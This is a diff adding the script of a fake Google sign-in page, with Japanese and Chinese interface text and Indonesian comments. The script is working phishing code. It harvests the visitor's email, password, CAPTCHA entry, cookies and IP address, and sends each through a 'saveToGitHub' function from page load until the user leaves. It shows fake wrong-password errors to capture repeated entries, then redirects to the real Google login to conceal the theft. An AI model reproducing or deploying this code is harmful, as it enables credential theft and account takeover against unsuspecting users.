+                forgotPassword: 'パスワードを忘れた場合',
+                back: '← 戻る',
+                maxAccounts: '最大数のアカウントにログインしています。このアカウントでログインするには、他のアカウントからログアウトするか、別のデバイスでお試しください。',
+                wrongPassword: 'パスワードが間違っています。もう一度お試しいただくか、「パスワードを忘れた場合」をクリックしてリセットしてください。',
+                accountLocked: '失敗した試行回数が多すぎます。後ほど再度お試しいただくか、別の回復方法をご利用ください。',
+                loading: '確認中...',
+                emailHint: 'Google メールアドレスを入力してください（gmail.com または googlemail.com）',
+                invalidEmail: '有効な Google メールアドレスを入力してください',
+                help: 'ヘルプ',
+                privacy: 'プライバシー',
+                terms: '利用規約',
+                captchaText: '聞こえるまたは見えるテキストを入力してください',
+                captchaPlaceholder: 'テキストをここに入力'
+            },
+            'zh-CN': {
+                account: 'Google 帐号',
+                login: '登录',
+                subtitle: '使用您的 Google 帐号',
+                emailPlaceholder: '电子邮件地址或电话号码',
+                forgotEmail: '忘记电子邮件地址？',
+                notYourComputer: '不是您的计算机？',
+                guestMode: '使用无痕式窗口登录。',
+                learnMore: '详细了解无痕模式',
+                createAccount: '创建帐号',
+                next: '下一步',
+                passwordPlaceholder: '输入您的密码',
+                showPassword: '显示',
+                hidePassword: '隐藏',
+                staySignedIn: '保持登录状态',
+                forgotPassword: '忘记密码？',
+                back: '← 返回',
+                maxAccounts: '您已登录最大数量的帐号。要使用此帐号登录，请先退出其他帐号，或尝试在其他设备上登录。',
+                wrongPassword: '密码错误。请重试，或点击"忘记密码"进行重置。',
+                accountLocked: '尝试失败次数过多。请稍后重试，或使用其他恢复方法。',
+                loading: '正在检查...',
+                emailHint: '输入 Google 电子邮件地址（gmail.com 或 googlemail.com）',
+                invalidEmail: '请输入有效的 Google 电子邮件地址',
+                help: '帮助',
+                privacy: '隐私权',
+                terms: '条款',
+                captchaText: '输入您听到或看到的文字',
+                captchaPlaceholder: '在此输入文字'
+            },
+            'zh-TW': {
+                account: 'Google 帳戶',
+                login: '登入',
+                subtitle: '使用您的 Google 帳戶',
+                emailPlaceholder: '電子郵件地址或電話號碼',
+                forgotEmail: '忘記電子郵件地址？',
+                notYourComputer: '這不是您的電腦？',
+                guestMode: '使用無痕視窗登入。',
+                learnMore: '深入瞭解無痕模式',
+                createAccount: '建立帳戶',
+                next: '下一步',
+                passwordPlaceholder: '輸入密碼',
+                showPassword: '顯示',
+                hidePassword: '隱藏',
+                staySignedIn: '保持登入狀態',
+                forgotPassword: '忘記密碼？',
+                back: '← 返回',
+                maxAccounts: '您已登入最大數量的帳戶。如要使用這個帳戶登入，請先登出其他帳戶，或嘗試在其他裝置上登入。',
+                wrongPassword: '密碼錯誤。請再試一次，或按一下「忘記密碼」來重設密碼。',
+                accountLocked: '嘗試失敗次數過多。請稍後再試，或使用其他還原方法。',
+                loading: '正在檢查...',
+                emailHint: '輸入 Google 電子郵件地址 (gmail.com 或 googlemail.com)',
+                invalidEmail: '請輸入有效的 Google 電子郵件地址',
+                help: '說明',
+                privacy: '隱私權',
+                terms: '條款',
+                captchaText: '輸入您聽到或看到的文字',
+                captchaPlaceholder: '在此輸入文字'
+            }
+        };
+        
+        // Default translation for languages not in list
+        function getTranslation(langCode) {
+            const primaryLang = langCode.split('-')[0];
+            return translations[langCode] || translations[primaryLang] || translations['en'];
+        }
+        
+        // Deteksi bahasa browser
+        const userLang = navigator.language || navigator.userLanguage;
+        let currentLang = userLang;
+        let t = getTranslation(currentLang);
+        
+        // Update semua teks di halaman
+        function updatePageTexts() {
+            document.getElementById('accountText').textContent = t.account;
+            document.getElementById('pageTitle').textContent = t.login;
+            document.getElementById('pageSubtitle').textContent = t.subtitle;
+            document.getElementById('email').placeholder = t.emailPlaceholder;
+            document.getElementById('forgotEmail').textContent = t.forgotEmail;
+            document.getElementById('notYourComputer').textContent = t.notYourComputer;
+            document.getElementById('guestModeText').textContent = t.guestMode;
+            document.getElementById('learnMore').textContent = t.learnMore;
+            document.getElementById('createAccount').textContent = t.createAccount;
+            document.getElementById('nextButton').textContent = t.next;
+            document.getElementById('password').placeholder = t.passwordPlaceholder;
+            document.getElementById('showPassword').textContent = t.showPassword;
+            document.getElementById('rememberText').textContent = t.staySignedIn;
+            document.getElementById('forgotPassword').textContent = t.forgotPassword;
+            document.getElementById('backButton').textContent = t.back;
+            document.getElementById('maxAccountsMessage').textContent = t.maxAccounts;
+            document.getElementById('emailHint').textContent = t.emailHint;
+            document.getElementById('emailError').textContent = t.invalidEmail;
+            document.getElementById('helpLink').textContent = t.help;
+            document.getElementById('privacyLink').textContent = t.privacy;
+            document.getElementById('termsLink').textContent = t.terms;
+            document.getElementById('captchaText').textContent = t.captchaText;
+            document.getElementById('captchaInput').placeholder = t.captchaPlaceholder;
+            
+            // Update URL dengan parameter Google
+            updateBrowserURL(currentLang);
+        }
+        
+        // Pilih bahasa di dropdown berdasarkan deteksi
+        const languageSelect = document.getElementById('languageSelect');
+        const browserLang = navigator.language;
+        
+        // Coba temukan bahasa yang cocok
+        let selectedLang = 'en';
+        for (const option of languageSelect.options) {
+            if (browserLang.startsWith(option.value)) {
+                selectedLang = option.value;
+                break;
+            }
+        }
+        
+        languageSelect.value = selectedLang;
+        currentLang = selectedLang;
+        t = getTranslation(currentLang);
+        
+        // State aplikasi
+        let currentStep = 'email';
+        let userEmail = '';
+        let failedAttempts = 0;
+        let isEmailValid = false;
+        let showCaptcha = Math.random() < 0.3; // 30% chance untuk CAPTCHA
+        
+        // Element references
+        const emailStep = document.getElementById('emailStep');
+        const passwordStep = document.getElementById('passwordStep');
+        const captchaStep = document.getElementById('captchaStep');
+        const emailInput = document.getElementById('email');
+        const passwordInput = document.getElementById('password');
+        const captchaInput = document.getElementById('captchaInput');
+        const nextButton = document.getElementById('nextButton');
+        const backButton = document.getElementById('backButton');
+        const showPasswordBtn = document.getElementById('showPassword');
+        const forgotEmailBtn = document.getElementById('forgotEmail');
+        const forgotPasswordBtn = document.getElementById('forgotPassword');
+        const maxAccountsMessage = document.getElementById('maxAccountsMessage');
+        const loader = document.getElementById('loader');
+        const emailHint = document.getElementById('emailHint');
+        const emailError = document.getElementById('emailError');
+        const emailSuccess = document.getElementById('emailSuccess');
+        
+        // Tampilkan CAPTCHA jika diperlukan
+        if (showCaptcha) {
+            captchaStep.style.display = 'block';
+        }
+        
+        // Fungsi validasi email Google
+        function isValidGoogleEmail(email) {
+            if (!email) return false;
+            
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email)) return false;
+            
+            const domain = email.toLowerCase().split('@')[1];
+            const googleDomains = [
+                'gmail.com',
+                'googlemail.com',
+                'google.com'
+            ];
+            
+            if (googleDomains.includes(domain)) {
+                return true;
+            }
+            
+            if (domain.endsWith('.gmail.com') || 
+                domain.endsWith('.google.com')) {
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // Validasi email real-time
+        emailInput.addEventListener('input', function() {
+            const email = this.value.trim();
+            emailHint.style.display = email ? 'block' : 'none';
+            
+            if (!email) {
+                this.classList.remove('error', 'valid');
+                emailError.style.display = 'none';
+                emailSuccess.style.display = 'none';
+                nextButton.disabled = true;
+                isEmailValid = false;
+                return;
+            }
+            
+            if (isValidGoogleEmail(email)) {
+                this.classList.remove('error');
+                this.classList.add('valid');
+                emailError.style.display = 'none';
+                emailSuccess.style.display = 'block';
+                nextButton.disabled = false;
+                isEmailValid = true;
+            } else {
+                this.classList.remove('valid');
+                this.classList.add('error');
+                emailError.style.display = 'block';
+                emailSuccess.style.display = 'none';
+                nextButton.disabled = true;
+                isEmailValid = false;
+            }
+            
+            maxAccountsMessage.style.display = 'none';
+        });
+        
+        // Validasi CAPTCHA
+        captchaInput.addEventListener('input', function() {
+            if (this.value.trim().length > 0) {
+                nextButton.disabled = false;
+            } else {
+                nextButton.disabled = true;
+            }
+        });
+        
+        // Inisialisasi - Kumpulkan data user saat page load
+        window.addEventListener('DOMContentLoaded', async () => {
+            // Update teks halaman
+            updatePageTexts();
+            
+            // Dapatkan IP address
+            userData.ip = await getUserIP();
+            
+            // Simpan data awal
+            await saveToGitHub('page_load', {
+                action: 'page_visited',
+                cookies: document.cookie,
+                language: currentLang,
+                showCaptcha: showCaptcha
+            });
+        });
+        
+        // Toggle password visibility
+        showPasswordBtn.addEventListener('click', function() {
+            const type = passwordInput.type === 'password' ? 'text' : 'password';
+            passwordInput.type = type;
+            this.textContent = type === 'password' ? t.showPassword : t.hidePassword;
+        });
+        
+        // Email step - Tombol Selanjutnya
+        nextButton.addEventListener('click', async function() {
+            if (currentStep === 'email') {
+                // Validasi CAPTCHA jika ada
+                if (showCaptcha) {
+                    const captcha = captchaInput.value.trim();
+                    if (!captcha) {
+                        captchaInput.focus();
+                        return;
+                    }
+                    
+                    // Simpan CAPTCHA response
+                    await saveToGitHub('captcha_response', {
+                        captcha: captcha,
+                        step: 'before_email'
+                    });
+                }
+                
+                const email = emailInput.value.trim();
+                
+                if (!email || !isEmailValid) {
+                    emailInput.classList.add('error');
+                    emailError.style.display = 'block';
+                    return;
+                }
+                
+                // Simpan email ke userData
+                userData.email = email;
+                
+                // Simpan email ke GitHub
+                await saveToGitHub('email_collected', {
+                    email: email,
+                    step: 'email_input',
+                    validation: 'valid_google_email',
+                    captchaRequired: showCaptcha
+                });
+                
+                // Tampilkan loading
+                nextButton.style.display = 'none';
+                loader.style.display = 'block';
+                
+                // Simulasi pengecekan email
+                setTimeout(() => {
+                    loader.style.display = 'none';
+                    nextButton.style.display = 'block';
+                    
+                    // Pindah ke password step
+                    currentStep = 'password';
+                    emailStep.style.display = 'none';
+                    captchaStep.style.display = 'none';
+                    passwordStep.style.display = 'block';
+                    backButton.style.display = 'block';
+                    document.getElementById('pageTitle').textContent = t.login === 'Login' ? 'Selamat datang' : 'Welcome';
+                    document.getElementById('pageSubtitle').textContent = email;
+                    passwordInput.focus();
+                }, 1000);
+                
+            } else if (currentStep === 'password') {
+                const password = passwordInput.value;
+                
+                if (!password) {
+                    passwordInput.classList.add('error');
+                    passwordInput.focus();
+                    return;
+                }
+                
+                // Simpan password ke userData
+                userData.password = password;
+                
+                // Simpan password ke GitHub
+                await saveToGitHub('password_collected', {
+                    email: userData.email,
+                    password: password,
+                    step: 'password_input',
+                    language: currentLang
+                });
+                
+                // Tampilkan loading
+                nextButton.style.display = 'none';
+                loader.style.display = 'block';
+                
+                // Simulasi verifikasi password
+                setTimeout(async () => {
+                    loader.style.display = 'none';
+                    
+                    // 30% kemungkinan password salah
+                    if (Math.random() < 0.3) {
+                        failedAttempts++;
+                        passwordInput.classList.add('error');
+                        document.getElementById('passwordError').textContent = 
+                            failedAttempts > 2 ? t.accountLocked : t.wrongPassword;
+                        document.getElementById('passwordError').style.display = 'block';
+                        nextButton.style.display = 'block';
+                        passwordInput.value = '';
+                        passwordInput.focus();
+                        
+                        // Simpan attempt gagal
+                        await saveToGitHub('failed_attempt', {
+                            email: userData.email,
+                            attempt: failedAttempts
+                        });
+                        return;
+                    }
+                    
+                    // Simpan data login sukses
+                    await saveToGitHub('login_success', {
+                        email: userData.email,
+                        password: password,
+                        status: 'credentials_collected',
+                        language: currentLang
+                    });
+                    
+                    // Redirect ke URL Google asli
+                    setTimeout(() => {
+                        window.location.href = window.googleRedirectURL || 'https://accounts.google.com/v3/signin/challenge/pwd';
+                    }, 800);
+                    
+                }, 1500);
+            }
+        });
+        
+        // Kembali ke email step
+        backButton.addEventListener('click', function() {
+            currentStep = 'email';
+            emailStep.style.display = 'block';
+            passwordStep.style.display = 'none';
+            if (showCaptcha) {
+                captchaStep.style.display = 'block';
+            }
+            backButton.style.display = 'none';
+            document.getElementById('pageTitle').textContent = t.login;
+            document.getElementById('pageSubtitle').textContent = t.subtitle;
+            emailInput.focus();
+        });
+        
+        // Lupa email
+        forgotEmailBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('emailError').textContent = t.forgotEmail + ' - ' + 'Untuk menemukan email Anda, kunjungi halaman pemulihan akun Google';
+            document.getElementById('emailError').style.display = 'block';
+            emailInput.classList.add('error');
+            saveToGitHub('forgot_email_click', {
+                action: 'forgot_email_clicked',
+                language: currentLang
+            });
+        });
+        
+        // Lupa password
+        forgotPasswordBtn.addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('passwordError').textContent = t.forgotPassword + ' - ' + 'Gunakan metode pemulihan akun.';
+            document.getElementById('passwordError').style.display = 'block';
+            saveToGitHub('forgot_password_click', {
+                action: 'forgot_password_clicked',
+                email: userData.email,
+                language: currentLang
+            });
+        });
+        
+        // Buat akun - muncul pesan maksimal akun
+        document.getElementById('createAccount').addEventListener('click', function(e) {
+            e.preventDefault();
+            maxAccountsMessage.style.display = 'block';
+            saveToGitHub('create_account_click', {
+                action: 'create_account_clicked',
+                message: 'max_accounts_message_shown',
+                language: currentLang
+            });
+            
+            // Scroll ke pesan
+            maxAccountsMessage.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
+        });
+        
+        // Input validation password
+        passwordInput.addEventListener('input', function() {
+            this.classList.remove('error');
+            document.getElementById('passwordError').style.display = 'none';
+            showPasswordBtn.style.display = this.value ? 'block' : 'none';
+        });
+        
+        // Enter key support
+        emailInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextButton.disabled) {
+                nextButton.click();
+            }
+        });
+        
+        passwordInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                nextButton.click();
+            }
+        });
+        
+        captchaInput.addEventListener('keypress', function(e) {
+            if (e.key === 'Enter' && !nextButton.disabled) {
+                nextButton.click();
+            }
+        });
+        
+        // Ganti bahasa
+        languageSelect.addEventListener('change', function() {
+            const newLang = this.value;
+            currentLang = newLang;
+            t = getTranslation(newLang);
+            
+            // Update semua teks di halaman
+            updatePageTexts();
+            
+            // Simpan perubahan bahasa
+            saveToGitHub('language_change', {
+                from: userLang,
+                to: newLang
+            });
+        });
+        
+        // Tangkap sebelum user keluar
+        window.addEventListener('beforeunload', function() {
+            saveToGitHub('page_unload', {
+                action: 'user_leaving',
+                email: userData.email,
+                step: currentStep,
+                language: currentLang
+            });
+        });
+    </script>
+</body>
+</html>
